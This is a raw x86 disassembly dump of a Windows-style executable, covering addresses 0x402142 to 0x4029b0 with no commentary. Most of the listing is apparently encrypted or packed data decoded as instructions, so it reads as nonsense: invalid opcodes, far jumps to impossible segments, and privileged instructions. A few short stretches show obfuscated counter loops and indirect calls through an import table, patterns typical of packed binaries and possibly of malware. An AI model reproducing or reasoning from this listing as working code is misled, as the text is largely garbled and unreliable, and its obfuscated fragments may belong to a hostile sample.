  402142:	xchg   DWORD PTR [esi],edi
  402144:	clc    
  402145:	in     al,0x4c
  402147:	sub    al,0x68
  402149:	xor    ebp,DWORD PTR [ecx+0x6b24f94f]
  40214f:	retf   0x60a9
  402152:	dec    ecx
  402153:	retf   0xaab0
  402156:	and    BYTE PTR [eax+edi*8],bh
  402159:	fild   QWORD PTR [esi]
  40215b:	or     dl,bh
  40215d:	mov    ebp,0x19463761
  402162:	xchg   DWORD PTR [edx+0x6176f073],esp
  402168:	jns    0x4021e1
  40216a:	shl    BYTE PTR [ebx+0x47],0x57
  40216e:	add    al,0x3b
  402170:	ins    BYTE PTR es:[edi],dx
  402171:	inc    edx
  402172:	fimul  DWORD PTR [edi]
  402174:	fs test al,0xa8
  402177:	jne    0x4020fa
  402179:	push   edi
  40217a:	lahf   
  40217b:	xchg   esi,eax
  40217c:	dec    ebx
  40217d:	adc    eax,eax
  40217f:	or     eax,DWORD PTR [ecx]
  402181:	mov    ah,0xcc
  402183:	xor    al,0xbc
  402185:	push   ebp
  402186:	ja     0x4021c6
  402188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402189:	ror    BYTE PTR [ebx-0x66d175ec],1
  40218f:	sub    esp,DWORD PTR [ebx-0x31]
  402192:	sub    al,0x58
  402194:	cmp    eax,0x6b89ec73
  402199:	and    DWORD PTR [edx-0x766010e9],edi
  40219f:	pop    ecx
  4021a0:	sbb    ecx,edx
  4021a2:	rol    BYTE PTR [ebx-0x1],1
  4021a5:	scas   al,BYTE PTR es:[edi]
  4021a6:	aas    
  4021a7:	pop    esp
  4021a8:	(bad)
  4021ac:	and    ebx,0x1b
  4021af:	test   DWORD PTR [ebx-0x6aa02b28],eax
  4021b5:	out    dx,eax
  4021b6:	adc    BYTE PTR [edi+edi*1],dl
  4021b9:	mov    esi,0xe7b67ed5
  4021be:	inc    esp
  4021bf:	push   ss
  4021c0:	jmp    0x3e3ffdf9
  4021c5:	pop    ebx
  4021c6:	pop    esp
  4021c7:	sti    
  4021c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c9:	push   ebp
  4021ca:	(bad)  
  4021cb:	or     eax,0x765d185d
  4021d0:	inc    ecx
  4021d1:	inc    esi
  4021d2:	dec    ebx
  4021d3:	cmc    
  4021d4:	jmp    0x39b8:0xf8567251
  4021db:	and    BYTE PTR [esi],ch
  4021dd:	push   ecx
  4021de:	jnp    0x4021aa
  4021e0:	(bad)
  4021e4:	(bad)  
  4021e5:	and    BYTE PTR [edi+0xa631111],dl
  4021eb:	das    
  4021ec:	sbb    al,0xd2
  4021ee:	lahf   
  4021ef:	sub    eax,0xd9a8932c
  4021f4:	or     bl,dh
  4021f6:	loopne 0x40217e
  4021f8:	cli    
  4021f9:	in     eax,dx
  4021fa:	pusha  
  4021fb:	mov    gs,WORD PTR [edi+ebx*1]
  4021fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021ff:	adc    al,0x46
  402201:	jo     0x4021b9
  402203:	rcl    DWORD PTR [esi-0x5d2f150f],cl
  402209:	adc    ah,dl
  40220b:	fmul   st,st(5)
  40220d:	mov    dl,0xf4
  40220f:	and    edi,ebp
  402211:	popa   
  402212:	jmp    0xe60a:0x67bc254e
  402219:	or     DWORD PTR [ebp+0x469b7c6e],esi
  40221f:	int    0x40
  402221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402222:	or     eax,0x9f9a860f
  402227:	in     eax,dx
  402228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402229:	dec    BYTE PTR [eax]
  40222b:	retf   
  40222c:	or     dh,BYTE PTR [esi]
  40222e:	int3   
  40222f:	fs jae 0x4021b2
  402232:	inc    ebx
  402233:	fidivr DWORD PTR [edx]
  402235:	call   0x968b:0x37b1d46
  40223c:	and    bh,BYTE PTR [edx+ebx*1+0x35]
  402240:	popf   
  402241:	repz addr16 pop edi
  402244:	aad    0x68
  402246:	xor    BYTE PTR [ebx],ah
  402248:	fdiv   DWORD PTR [esi+0x21]
  40224b:	ss cli 
  40224d:	sti    
  40224e:	ror    DWORD PTR [ecx+0x7a],0x76
  402252:	popf   
  402253:	mov    al,0x85
  402255:	add    DWORD PTR [ecx+0x68],eax
  402258:	icebp  
  402259:	adc    dh,0xd1
  40225c:	jecxz  0x402279
  40225e:	stc    
  40225f:	aaa    
  402260:	push   esp
  402261:	jns    0x402204
  402263:	nop
  402264:	icebp  
  402265:	es icebp 
  402267:	fld    QWORD PTR [edi]
  402269:	inc    eax
  40226a:	jmp    0x1bccb79
  40226f:	pop    edx
  402270:	cs es xor al,0x7f
  402274:	jb     0x402293
  402276:	jle    0x4022c2
  402278:	cld    
  402279:	les    edi,FWORD PTR [edx]
  40227b:	dec    ebx
  40227c:	mov    dh,0xea
  40227e:	push   es
  40227f:	xor    edi,edi
  402281:	sti    
  402282:	or     al,0xbc
  402284:	out    dx,eax
  402285:	retf   0xc96a
  402288:	sub    al,0x8f
  40228a:	push   es
  40228b:	mov    esp,0x40db3812
  402290:	cmp    BYTE PTR [ecx+0xa],ah
  402293:	je     0x402292
  402295:	or     ebp,eax
  402297:	or     BYTE PTR [edx+0x8889db5],ah
  40229d:	cwde   
  40229e:	popf   
  40229f:	mov    al,0xf1
  4022a1:	dec    ecx
  4022a2:	jns    0x4022a2
  4022a4:	or     cl,BYTE PTR [eax-0x26]
  4022a7:	iret   
  4022a8:	jmp    0x54052474
  4022ad:	rcl    si,1
  4022b0:	fs jnp 0x402235
  4022b3:	popa   
  4022b4:	pop    edi
  4022b5:	or     bh,dl
  4022b7:	(bad)  
  4022b8:	sti    
  4022b9:	or     al,0xee
  4022bb:	and    eax,0x8a35ebfe
  4022c0:	popa   
  4022c1:	shl    BYTE PTR [ebp-0x44],cl
  4022c4:	dec    esp
  4022c5:	retf   
  4022c6:	(bad)  
  4022c7:	js     0x4022e9
  4022c9:	push   edx
  4022ca:	adc    eax,0x6f258151
  4022cf:	in     al,dx
  4022d0:	inc    edx
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    BYTE PTR [ebx+0x42ec6f15],cl
  4022db:	add    BYTE PTR [edx-0x77],al
  4022de:	adc    eax,0x42ec6f
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	lea    edi,[ebp+0x3db19e0]
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023b1
  40236e:	jge    0x4023e4
  402370:	div    BYTE PTR [eax-0x2b]
  402373:	jmp    0x40235d
  402375:	xchg   ecx,eax
  402376:	sbb    al,0xce
  402378:	dec    edi
  402379:	inc    edi
  40237a:	clc    
  40237b:	clc    
  40237c:	inc    ebp
  40237d:	int3   
  40237e:	and    DWORD PTR [ebp-0x277ca29],ebp
  402384:	mov    ch,0xd4
  402386:	sub    bh,BYTE PTR [edi]
  402388:	jg     0x402387
  40238a:	mov    eax,ds:0xd4bd3553
  40238f:	xchg   ecx,eax
  402390:	cmp    BYTE PTR [eax],dh
  402392:	mov    DWORD PTR [edx-0x33],ecx
  402395:	pop    ecx
  402396:	(bad)  
  402397:	(bad)  
  402398:	sub    ebp,DWORD PTR [esi+0x1d]
  40239b:	cmp    esi,edi
  40239d:	and    cl,ah
  40239f:	mov    dl,0xd0
  4023a1:	push   es
  4023a2:	mov    edi,0x4015f93f
  4023a7:	stos   BYTE PTR es:[edi],al
  4023a8:	pop    ebp
  4023a9:	xor    edi,DWORD PTR [ebx]
  4023ab:	mov    ds:0x2098fc21,eax
  4023b0:	sti    
  4023b1:	je     0x402430
  4023b3:	mov    bh,al
  4023b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b6:	mov    ebp,0x31e4d31f
  4023bb:	stos   BYTE PTR es:[edi],al
  4023bc:	test   BYTE PTR [edi],bh
  4023be:	xchg   dh,cl
  4023c0:	inc    ecx
  4023c1:	in     eax,dx
  4023c2:	int3   
  4023c3:	mov    eax,esp
  4023c5:	in     eax,0xa4
  4023c7:	test   al,0x82
  4023c9:	sbb    al,0x5
  4023cb:	inc    ebx
  4023cc:	sub    al,0x4a
  4023ce:	inc    edi
  4023cf:	jle    0x40239e
  4023d1:	pusha  
  4023d2:	inc    esp
  4023d3:	fcom   st(1)
  4023d5:	sbb    al,0x34
  4023d7:	mul    BYTE PTR [ebx-0x26]
  4023da:	loope  0x4023cc
  4023dc:	cmp    eax,0xbf30ca3b
  4023e1:	repz and esi,DWORD PTR [ebx-0x3023c7f]
  4023e8:	aam    0xde
  4023ea:	fwait
  4023eb:	out    dx,al
  4023ec:	push   cs
  4023ed:	dec    ebp
  4023ee:	aaa    
  4023ef:	jne    0x4023d0
  4023f1:	mov    al,0xdd
  4023f3:	xor    BYTE PTR [ebx-0x15],al
  4023f6:	xchg   BYTE PTR [esi-0x22f58105],dl
  4023fc:	aad    0xd3
  4023fe:	movd   mm4,edx
  402401:	aam    0x48
  402403:	sbb    BYTE PTR [esi+0x7d9c718c],ah
  402409:	adc    BYTE PTR [esi+0x49],dl
  40240c:	add    al,0x30
  40240e:	(bad)  
  40240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402410:	and    eax,0x5c163239
  402415:	cmp    DWORD PTR [ebx+esi*4-0x40],0xc
  40241a:	adc    esi,DWORD PTR [edi+edi*4+0x72]
  40241e:	scas   al,BYTE PTR es:[edi]
  40241f:	sub    esp,esp
  402421:	js     0x402410
  402423:	cwde   
  402424:	xor    al,0x25
  402426:	in     eax,dx
  402427:	rcl    BYTE PTR [ecx+edi*2],cl
  40242a:	xchg   ebx,eax
  40242b:	push   cs
  40242c:	stc    
  40242d:	pop    edi
  40242e:	(bad)  
  40242f:	sub    al,0xed
  402431:	das    
  402432:	nop
  402433:	pop    esp
  402434:	jl     0x402489
  402436:	pop    edx
  402437:	mov    ah,0x3a
  402439:	push   ds
  40243a:	xchg   esp,eax
  40243b:	fisub  WORD PTR [edx-0x73]
  40243e:	dec    esi
  40243f:	or     eax,DWORD PTR [edx]
  402441:	inc    ebp
  402442:	mov    edi,0xe26d7792
  402447:	push   edi
  402448:	jle    0x402416
  40244a:	popf   
  40244b:	or     al,0x2d
  40244d:	cli    
  40244e:	inc    esp
  40244f:	out    dx,eax
  402450:	inc    ebx
  402451:	test   DWORD PTR [esi+0x4d4f1961],esp
  402457:	mov    eax,0x1a514b3
  40245c:	push   es
  40245d:	mov    ?,WORD PTR [esi-0x68]
  402460:	push   es
  402461:	push   esp
  402462:	out    0x27,al
  402464:	rol    BYTE PTR [ebx-0x51ac9c9b],1
  40246a:	jns    0x4024da
  40246c:	jnp    0x4024bf
  40246e:	mov    edi,0x88aa8ad2
  402473:	mov    BYTE PTR gs:[ebp-0x5c],cl
  402477:	test   eax,0x531299b
  40247c:	push   esp
  40247d:	pop    ss
  40247e:	jg     0x40247b
  402480:	jle    0x40240a
  402482:	push   edx
  402483:	dec    bx
  402485:	pop    eax
  402486:	pop    edx
  402487:	ins    BYTE PTR es:[edi],dx
  402488:	cmp    BYTE PTR [edi+0x7fed9e7b],bh
  40248e:	jmp    0x40242b
  402490:	xchg   esi,eax
  402491:	test   DWORD PTR [eax+eax*2],esi
  402494:	loop   0x40242f
  402496:	popa   
  402497:	aaa    
  402498:	mov    fs,WORD PTR [edx+0x61]
  40249b:	icebp  
  40249c:	loop   0x402453
  40249e:	xchg   ecx,eax
  40249f:	sub    DWORD PTR [ecx+edx*8+0x1347c9d],0xffffff9f
  4024a7:	in     eax,dx
  4024a8:	push   0xb2c7a0dc
  4024ad:	es mov edx,0x582dc9dd
  4024b3:	retf   0x4fb0
  4024b6:	test   BYTE PTR [ecx+ebx*4-0x1fd90114],0xe4
  4024be:	push   cs
  4024bf:	xchg   cl,dl
  4024c1:	mov    esi,0xaa50e6a5
  4024c6:	inc    ebx
  4024c7:	adc    al,0xc8
  4024c9:	fwait
  4024ca:	retf   
  4024cb:	out    dx,eax
  4024cc:	push   0xfffffff5
  4024ce:	mov    cl,0x4a
  4024d0:	inc    ebp
  4024d1:	sbb    BYTE PTR [esp+edi*8-0x16],dl
  4024d5:	icebp  
  4024d6:	xchg   esp,eax
  4024d7:	loopne 0x402496
  4024d9:	mov    edi,0x370b6ceb
  4024de:	jmp    0x40249e
  4024e0:	mov    edi,0xb37d8265
  4024e5:	jg     0x402516
  4024e7:	mov    BYTE PTR [edx],bl
  4024e9:	mov    gs,WORD PTR [eax]
  4024eb:	cdq    
  4024ec:	mov    dl,0x45
  4024ee:	lds    eax,FWORD PTR [bx]
  4024f1:	imul   ecx,ecx,0xa7d518ac
  4024f7:	lods   eax,DWORD PTR ds:[esi]
  4024f8:	sub    al,0x47
  4024fa:	jmp    0x5ad:0x67a53787
  402501:	(bad)  
  402503:	loope  0x402532
  402505:	push   esp
  402506:	ss loopne 0x402491
  402509:	outs   dx,BYTE PTR ds:[esi]
  40250a:	test   al,0xb3
  40250c:	jo     0x4024a2
  40250e:	mov    dh,bh
  402510:	jmp    0xccbe:0xcc7cb056
  402517:	mov    ebx,0x7db79502
  40251c:	dec    edi
  40251d:	mov    ch,cl
  40251f:	mov    dl,0x26
  402521:	push   ebx
  402522:	sbb    eax,0x4fb409e2
  402527:	add    esi,DWORD PTR [ecx+0x32a890c6]
  40252d:	dec    ecx
  40252e:	inc    eax
  40252f:	ret    0xbee
  402532:	mov    dl,0x5c
  402534:	add    eax,0xd968f92
  402539:	dec    esi
  40253a:	cmc    
  40253b:	std    
  40253c:	scas   eax,DWORD PTR es:[edi]
  40253d:	leave  
  40253e:	repnz inc ecx
  402540:	sub    eax,0x9727937
  402545:	adc    dh,bl
  402547:	inc    esp
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42ec4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs jne 0x4025e7
  402614:	mov    cl,dh
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x402684
  40261f:	inc    ebx
  402620:	add    eax,0xf2d61218
  402625:	cmp    ebx,DWORD PTR [edi]
  402627:	sbb    ebx,edx
  402629:	jns    0x40261d
  40262b:	pop    edi
  40262c:	push   0xffffffa3
  40262e:	lds    eax,FWORD PTR [edx]
  402630:	pop    edx
  402631:	jne    0x40268f
  402633:	push   ebp
  402634:	test   BYTE PTR [eax],dl
  402636:	fs dec edi
  402638:	jae    0x402615
  40263a:	inc    edx
  40263b:	and    dl,BYTE PTR [ecx+0x2764a671]
  402641:	mov    ds:0x887190c2,eax
  402646:	iret   
  402647:	ficomp WORD PTR [ecx]
  402649:	and    DWORD PTR [eax+0x55],esi
  40264c:	repz mov bl,0x2d
  40264f:	sbb    al,0x15
  402651:	inc    esi
  402652:	dec    esi
  402653:	(bad)
  402656:	lock ins DWORD PTR es:[edi],dx
  402658:	pop    esi
  402659:	imul   eax,DWORD PTR [eax+0x16],0x76
  40265d:	call   0x3fdb:0x2ee40c36
  402664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402665:	push   esp
  402666:	xor    cl,BYTE PTR [ebx]
  402668:	adc    al,0xf8
  40266a:	push   ebx
  40266b:	test   DWORD PTR [ecx-0x6b],ebp
  40266e:	pop    ebp
  40266f:	cmp    ch,dh
  402671:	lea    ebx,[ebx]
  402673:	push   eax
  402674:	and    al,0x22
  402676:	inc    ebp
  402677:	sub    edx,edx
  402679:	inc    ecx
  40267a:	jae    0x402647
  40267c:	outs   dx,BYTE PTR ds:[esi]
  40267d:	push   ecx
  40267e:	mov    ch,0x58
  402680:	rol    DWORD PTR [esi+0x51],0xf6
  402684:	rol    DWORD PTR [edx+0xeaf9df4],1
  40268a:	ror    DWORD PTR [edx+0x44eb0135],0x6f
  402691:	dec    esp
  402692:	pop    ss
  402693:	jae    0x4026ec
  402695:	pop    ebp
  402696:	cmp    ebp,DWORD PTR [ebx+0x24d9ffa8]
  40269c:	cld    
  40269d:	xchg   edi,eax
  40269e:	fcomp  QWORD PTR [edi+eax*4]
  4026a1:	lods   eax,DWORD PTR ds:[esi]
  4026a2:	scas   eax,DWORD PTR es:[edi]
  4026a3:	and    eax,0xbc01bbfb
  4026a8:	mov    esp,0x8be55cd
  4026ad:	retf   0x64c1
  4026b0:	outs   dx,DWORD PTR ss:[esi]
  4026b2:	or     dl,cl
  4026b4:	xor    al,0x6b
  4026b6:	pop    ecx
  4026b7:	hlt    
  4026b8:	test   BYTE PTR [esi+0x13c5550],bh
  4026be:	xchg   esp,eax
  4026bf:	jmp    0xfbde44bd
  4026c4:	gs ins DWORD PTR es:[edi],dx
  4026c6:	dec    ebx
  4026c7:	sbb    BYTE PTR [edx+0x4add0b30],ah
  4026cd:	inc    ecx
  4026ce:	and    al,0xc0
  4026d0:	test   eax,0x8c981f4e
  4026d5:	push   0x8aac0250
  4026da:	stos   BYTE PTR es:[edi],al
  4026db:	sbb    DWORD PTR [esi+0x7c],esp
  4026de:	mov    BYTE PTR [ebx],bh
  4026e0:	lds    edx,FWORD PTR [bx-0x7]
  4026e4:	fwait
  4026e5:	leave  
  4026e6:	or     bh,BYTE PTR [esi-0xf]
  4026e9:	test   al,0x73
  4026eb:	dec    edx
  4026ec:	int3   
  4026ed:	xchg   edi,eax
  4026ee:	fwait
  4026ef:	inc    eax
  4026f0:	sub    al,0xa
  4026f2:	inc    edi
  4026f3:	fisub  DWORD PTR [ecx]
  4026f5:	xchg   BYTE PTR [edi-0x14d063da],al
  4026fb:	fistp  DWORD PTR [ecx+edx*2-0x42f5334e]
  402702:	xor    esp,ebx
  402704:	fistp  DWORD PTR [ebp-0x73871908]
  40270a:	sti    
  40270b:	call   0x4064:0x850e7ea6
  402712:	pop    edi
  402713:	pusha  
  402714:	mov    dh,0xce
  402716:	cs inc ebp
  402718:	repnz adc ebp,ebp
  40271b:	jmp    0x4026f7
  40271d:	dec    ecx
  40271e:	or     DWORD PTR [ecx+0x7d],esp
  402721:	pop    esi
  402722:	gs jmp 0x80814164
  402728:	or     dl,BYTE PTR [edx+ecx*4]
  40272b:	les    esp,FWORD PTR [edx+0x54]
  40272e:	xchg   edi,eax
  40272f:	ret    0xd0cd
  402732:	jge    0x402739
  402734:	adc    BYTE PTR [edi],dl
  402736:	repnz push edx
  402738:	push   eax
  402739:	fisubr WORD PTR [esi-0xa]
  40273c:	xchg   ecx,eax
  40273d:	dec    esp
  40273e:	mul    DWORD PTR [edx+0x9168b63]
  402744:	mov    edx,0xd1ccef61
  402749:	jl     0x4027b7
  40274b:	jmp    0x25fa:0x9801cb8b
  402752:	cmp    eax,0xc523a5f2
  402757:	test   eax,0x73b001a0
  40275c:	push   edi
  40275d:	jmp    0x4ab6:0x57c41290
  402764:	addr16 add eax,0xd8f4fb1e
  40276a:	(bad)  
  40276b:	fild   DWORD PTR [eax-0x19]
  40276e:	sbb    dh,dh
  402770:	cmp    eax,0xe33b84aa
  402775:	dec    eax
  402776:	or     cl,dl
  402778:	lods   eax,DWORD PTR ds:[esi]
  402779:	xlat   BYTE PTR ds:[ebx]
  40277a:	xchg   esp,eax
  40277b:	fcomp  DWORD PTR [ecx-0x3775ba5]
  402781:	es call 0x33f0:0xb66c6258
  402789:	jg     0x40277d
  40278b:	or     dl,BYTE PTR [eax]
  40278d:	mov    ch,0xb9
  40278f:	into   
  402790:	xchg   edx,eax
  402791:	xchg   ebp,eax
  402792:	and    DWORD PTR [ebx-0x5],esp
  402795:	test   DWORD PTR [ebp+0x17],ecx
  402798:	or     DWORD PTR [edi],ebx
  40279a:	xchg   edi,eax
  40279b:	rcl    ch,0x18
  40279e:	stc    
  40279f:	pushf  
  4027a0:	mov    BYTE PTR [eax],bh
  4027a2:	xor    dl,BYTE PTR [eax-0x74]
  4027a5:	mov    WORD PTR [ebx],es
  4027a7:	mov    al,ds:0x29aaabf
  4027ac:	mov    ebx,0xcba5f9e7
  4027b1:	jle    0x40277f
  4027b3:	mov    ebp,0xc0c9aee4
  4027b8:	push   edx
  4027b9:	jne    0x40276e
  4027bb:	pop    esp
  4027bc:	cwde   
  4027bd:	jns    0x40281e
  4027bf:	jbe    0x402836
  4027c1:	cmp    DWORD PTR [ebx],eax
  4027c3:	dec    eax
  4027c4:	sar    DWORD PTR [edx+0x2743f18c],0x8c
  4027cb:	fcomp  st(0)
  4027cd:	sti    
  4027ce:	jne    0x4027e1
  4027d0:	loope  0x40275a
  4027d2:	jnp    0x40275a
  4027d4:	fnstenv [ecx-0x5c9a28ba]
  4027da:	push   ebx
  4027db:	retf   0xff23
  4027de:	retf   0x4c44
  4027e1:	jmp    0x1226ce89
  4027e6:	mov    WORD PTR [eax-0x71],cs
  4027e9:	dec    eax
  4027ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027eb:	mov    WORD PTR [edi-0x1e],es
  4027ee:	sbb    BYTE PTR [ebx],dl
  4027f0:	xor    BYTE PTR [edx+edx*1+0x42f90782],dh
  4027f7:	jne    0x4027e5
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    ebp,eax
  402828:	daa    
  402829:	mov    ds:0x7e0f15a0,al
  40282e:	jle    0x402885
  402830:	jg     0x4028b0
  402832:	jle    0x402834
  402834:	fidivr WORD PTR [esi]
  402836:	jmp    0x7f1e31b8
  40283b:	scas   al,BYTE PTR es:[edi]
  40283c:	add    al,0x9f
  40283e:	ja     0x402895
  402840:	jmp    0x3a00d382
  402845:	or     ebp,DWORD PTR [ecx]
  402847:	fstp   DWORD PTR [ecx-0x1d]
  40284a:	jmp    0xd652:0x47843b5f
  402851:	dec    dl
  402853:	mov    eax,ds:0xfbf8afeb
  402858:	loope  0x402826
  40285a:	(bad)  
  40285b:	and    al,0x65
  40285d:	enter  0xf369,0x2e
  402861:	sub    ebp,DWORD PTR [eax]
  402863:	loope  0x40288d
  402865:	adc    bh,ch
  402867:	sbb    BYTE PTR [ebx-0x70],al
  40286a:	rcl    DWORD PTR [ecx-0x61],cl
  40286d:	stos   DWORD PTR es:[edi],eax
  40286e:	jp     0x402890
  402870:	sahf   
  402871:	mov    WORD PTR [eax+0x62],es
  402874:	shl    dh,1
  402876:	test   eax,0xd1265e71
  40287b:	ja     0x40289c
  40287d:	leave  
  40287e:	neg    DWORD PTR [ebx-0x5df79a45]
  402884:	mov    ds:0xd854a8a6,al
  402889:	inc    esi
  40288a:	sbb    al,0xac
  40288c:	rol    BYTE PTR [edi+eiz*2-0x5],cl
  402890:	cmp    al,0x15
  402892:	cwde   
  402893:	ja     0x402815
  402895:	mov    eax,ds:0xdac8487b
  40289a:	enter  0xa3fe,0x13
  40289e:	push   0xad0ee142
  4028a3:	aas    
  4028a4:	(bad)  
  4028a5:	cmp    eax,0x4d997510
  4028aa:	mov    edi,0xf93226d8
  4028af:	pop    edx
  4028b0:	nop
  4028b1:	test   eax,0xce2b44a1
  4028b6:	inc    edi
  4028b7:	push   ss
  4028b8:	xor    BYTE PTR [edx],cl
  4028ba:	mov    eax,0xd8b264e6
  4028bf:	ds cmc 
  4028c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c2:	push   edx
  4028c3:	in     al,0xbd
  4028c5:	in     al,dx
  4028c6:	jb     0x402892
  4028c8:	sub    BYTE PTR [edi],0xa5
  4028cb:	mov    ebx,0xfbfda97f
  4028d0:	test   eax,0x6cabc891
  4028d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d6:	fimul  DWORD PTR [edi+0x61]
  4028d9:	imul   esi,DWORD PTR [ecx+0x78],0xffffffc2
  4028dd:	add    al,0x41
  4028df:	pop    esi
  4028e0:	mov    DWORD PTR [edi+0x25efce60],edx
  4028e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e7:	inc    ebp
  4028e8:	sub    al,0xef
  4028ea:	add    BYTE PTR [ecx+0x38e4a22e],ah
  4028f0:	out    0x2b,eax
  4028f2:	mov    ds:0xb641d6db,al
  4028f7:	add    al,0x8b
  4028f9:	std    
  4028fa:	dec    ecx
  4028fb:	jle    0x4028f7
  4028fd:	add    eax,0xa6369820
  402902:	(bad)  
  402903:	out    0xe8,eax
  402905:	ret    
  402906:	cmp    eax,0x96c5c75a
  40290b:	fist   WORD PTR ds:0x7a496b35
  402911:	ds cwde 
  402913:	and    al,0xe8
  402915:	add    al,0x14
  402917:	sbb    dl,BYTE PTR [ebx+0x32ca9849]
  40291d:	in     eax,dx
  40291e:	in     al,dx
  40291f:	xor    bl,BYTE PTR [edi-0x4b8b4c6e]
  402925:	fidiv  WORD PTR [bp+di]
  402928:	cmp    BYTE PTR [edi],ch
  40292a:	mov    bh,0x52
  40292c:	push   eax
  40292d:	and    ebp,ebp
  40292f:	icebp  
  402930:	je     0x402916
  402932:	mov    dl,0xea
  402934:	or     eax,0xf2c8a3bf
  402939:	out    0x7c,eax
  40293b:	jmp    0xf9db:0x9ec22c82
  402942:	cwde   
  402943:	or     bh,BYTE PTR [ebx-0x72]
  402946:	inc    edx
  402947:	sbb    edi,eax
  402949:	pop    es
  40294a:	ret    0xebe4
  40294d:	pop    ds
  40294e:	cli    
  40294f:	dec    esi
  402950:	cmp    bl,ah
  402952:	push   ds
  402953:	stc    
  402954:	xchg   esp,eax
  402955:	(bad)  
  402956:	out    dx,al
  402957:	xchg   ecx,eax
  402958:	fucom  st(2)
  40295a:	ror    BYTE PTR [ecx+0x114c3480],cl
  402960:	push   ebx
  402961:	mov    WORD PTR [edx+0x2b],ds
  402964:	adc    eax,0x693550e
  402969:	loope  0x4029e6
  40296b:	in     eax,dx
  40296c:	and    BYTE PTR [edx+0x17],dl
  40296f:	xchg   BYTE PTR [edi],dl
  402971:	inc    esp
  402972:	into   
  402973:	push   ds
  402974:	mov    ecx,0x5103f198
  402979:	mov    ds:0x42d30e91,al
  40297e:	cmp    BYTE PTR [esi+0x6a4e6e74],cl
  402984:	mov    esp,0x3bf4f00f
  402989:	in     al,0x1c
  40298b:	cli    
  40298c:	mov    ebp,0x7fed625b
  402991:	call   0x67aa98b8
  402996:	dec    edi
  402997:	outs   dx,DWORD PTR ds:[esi]
  402998:	mov    bh,0x54
  40299a:	inc    esi
  40299b:	add    cl,bl
  40299d:	mov    eax,0x2b6188bc
  4029a2:	dec    eax
  4029a3:	out    0xe9,eax
  4029a5:	cmp    eax,0xfd538f6e
  4029aa:	dec    ecx
  4029ab:	mov    esi,0xfbc56780
  4029b0:	dec    ebp
